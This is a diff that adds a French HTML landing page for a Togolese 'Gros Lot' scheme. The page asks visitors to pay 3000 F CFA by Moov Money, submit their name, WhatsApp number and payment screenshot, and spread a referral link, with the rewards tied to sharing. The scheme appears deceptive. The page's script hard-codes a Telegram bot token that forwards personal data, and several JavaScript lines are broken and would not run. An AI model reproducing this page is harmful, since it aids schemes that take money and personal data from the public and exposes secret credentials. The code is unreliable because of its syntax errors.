@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mise 3000 F - Gros Lot</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #2b0f3f, #000000);
+      color: #fff;
+    }
+    header {
+      background: linear-gradient(to right, #5e2b97, #d4af37);
+      color: white;
+      padding: 30px;
+      text-align: center;
+      border-bottom-left-radius: 30px;
+      border-bottom-right-radius: 30px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+      animation: slideDown 1s ease;
+    }
+    .container {
+      padding: 20px;
+      animation: fadeIn 1.5s ease;
+    }
+    .image-placeholder, .step-image {
+      width: 100%;
+      height: auto;
+      background: rgba(255, 255, 255, 0.1);
+      color: #ccc;
+      font-style: italic;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px dashed #888;
+      border-radius: 20px;
+    }
+    .section {
+      margin-bottom: 40px;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 20px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(212, 175, 55, 0.2);
+    }
+    h2 {
+      color: #d4af37;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      box-shadow: inset 0 0 5px #000;
+    }
+    input[type="file"] {
+      color: #ccc;
+    }
+    button {
+      background: linear-gradient(to right, #d4af37, #5e2b97);
+      color: white;
+      font-weight: bold;
+      transition: transform 0.3s;
+    }
+    button:hover {
+      transform: scale(1.05);
+    }
+    .generated-link {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 12px;
+      border-radius: 12px;
+      margin: 10px 0;
+      word-break: break-word;
+    }
+    footer {
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #ccc;
+      border-top: 1px solid #444;
+      margin-top: 40px;
+    }
+    a.whatsapp {
+      background: #25D366;
+      color: white;
+      padding: 10px 20px;
+      display: inline-block;
+      margin-right: 10px;
+      border-radius: 20px;
+      text-decoration: none;
+      transition: transform 0.3s;
+    }
+    a.telegram {
+      background: #0088cc;
+      color: white;
+      padding: 10px 20px;
+      display: inline-block;
+      border-radius: 20px;
+      text-decoration: none;
+      transition: transform 0.3s;
+    }
+    a.whatsapp:hover, a.telegram:hover {
+      transform: scale(1.1);
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .responsive-image {
+        width: 100%;
+        height: 200%;
+        object-fit: cover;
+        border-radius: 20px;
+        display: block;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Projet GROS LOT.TG</h1>
+  </header>  <div class="container">
+    <div class="section">
+      <h2>Gros Lot</h2>
+      <img src="car.jpg" alt="" class="responsive-image">
+    </div><div class="section">
+  <h2>Description</h2>
+  <p>Un projet 100% togolais qui consiste à miser 3000 F et partager un lien au plus de monde possible. Plus tu partages, plus tu as la chance de remporter le gros lot. 10 personnes seront choisies au hasard, mais surtout parmi ceux qui ont le plus partagé. Si tu ne gagnes pas, 75 % de ta mise te sera retournée. Tu seras aussi prioritaire pour la prochaine édition !</p>
+</div>
+
+<div class="section">
+  <h2>Comment commencer ?</h2>
+  <ol>
+    <li>Envoyez 3000 F au numéro suivant et capturez le message :
+        <div class="step-image">
+            <img src="transfert.jpg" alt="" class="responsive-image">
+        </div>
+    </li>
+    <li>Remplissez le formulaire avec votre nom, prénom, numéro WhatsApp et la capture d'écran :
+        <div class="step-image">
+            <img src="information.jpg" alt="" class="responsive-image">
+        </div>
+    </li>
+    <li>Cliquez sur envoyer. Vous recevrez un message sur WhatsApp sous 24h :
+      <div class="step-image">
+        <img src="confirmation.jpg" alt="" class="responsive-image">
+        </div>
+    </li>
+    <li>Vous recevrez ensuite votre lien personnel à partager :
+      <div class="step-image">
+        <img src="lien.jpg" alt="" class="responsive-image">
+      </div>
+    </li>
+  </ol>
+</div>
+
+<div class="section">
+  <h2>Commencer la mise</h2>
+  <p>Envoyez 3000 F CFA à ce numéro Moov Money : <strong>98 27 17 52</strong></p>
+
+  <form id="miseForm">
+    <input type="text" name="nom" placeholder="Nom" required>
+    <input type="text" name="prenom" placeholder="Prénom" required>
+    <input type="text" name="whatsapp" placeholder="Numéro WhatsApp" required>
+    <input type="file" name="capture" required>
+    <button type="submit">Envoyer les informations</button>
+  </form>
+
+  <div class="generated-link" id="lienGenere">Votre lien apparaîtra ici...</div>
+  <button onclick="partagerLien()">Partager ce lien</button>
+</div>
+
+<div class="section">
+  <h2>Contacts</h2>
+  <a href="https://wa.me/22879617995" class="whatsapp">WhatsApp</a>
+  <a href="https://t.me/Groslottg" class="telegram">Telegram</a>
+</div>
+
+<footer>
+  <p>Merci pour votre confiance ! Ensemble, changeons les règles du jeu.</p>
+  <p>– L'Équipe du Projet</p>
+</footer>
+
+  </div>  <script>
+    const BOT_TOKEN = "7682898339:AAFDXTkMqsc29VA9Mkf6U2cygfKN6nNnT68";
+    const CHAT_ID = "6446399357"; // groupe privé ou ID perso
+
+    document.getElementById("miseForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const nom = form.nom.value;
+      const prenom = form.prenom.value;
+      const whatsapp = form.whatsapp.value;
+      const capture = form.capture.files[0];
+
+      // Message texte à envoyer
+      const textMessage = Nouvelle participation !\nNom: ${nom}\nPrénom: ${prenom}\nWhatsApp: ${whatsapp};
+
+      // Envoi du message texte
+      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
+      });
+
+      // Envoi de l'image
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", capture);
+      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+        method: "POST",
+        body: formData
+      });
+
+      // Génération du lien personnalisé
+      const baseURL = window.location.origin;
+      const lien = `${baseURL}/jeu?ref=$
+      {encodeURIcomponent(nom + prenom + whatsapp)}`;
+      document.getElementById("lienGenere").innerText = lien;
+      alert("Informations envoyées. Un message vous sera envoyé sur WhatsApp.");
+    });
+
+    function partagerLien() {
+      const lien = document.getElementById("lienGenere").innerText;
+      if (navigator.share) {
+        navigator.share({
+          title: "Participez au jeu !",
+          text: "Essaye de gagner le gros lot, clique ici :",
+          url: lien
+        });
+      } else {
+        alert("Copiez ce lien et partagez-le :\n" + lien);
+      }
+    }
+  </script></body>
+</html>
